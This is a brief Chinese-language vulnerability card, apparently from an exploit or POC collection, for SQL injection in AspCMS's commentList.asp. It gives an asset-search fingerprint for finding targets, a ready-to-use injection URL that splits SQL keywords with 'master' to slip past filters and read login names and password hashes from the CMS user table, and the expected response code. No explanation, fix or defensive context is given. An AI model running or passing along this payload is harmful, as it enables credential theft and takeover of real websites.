# AspCMS系统commentList.asp存在SQL注入漏洞

AspCMS ｜ SQL注入 ｜ —
- **指纹**：`app="ASPCMS"`

**Payload**
```
/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user
```
- **响应特征**：200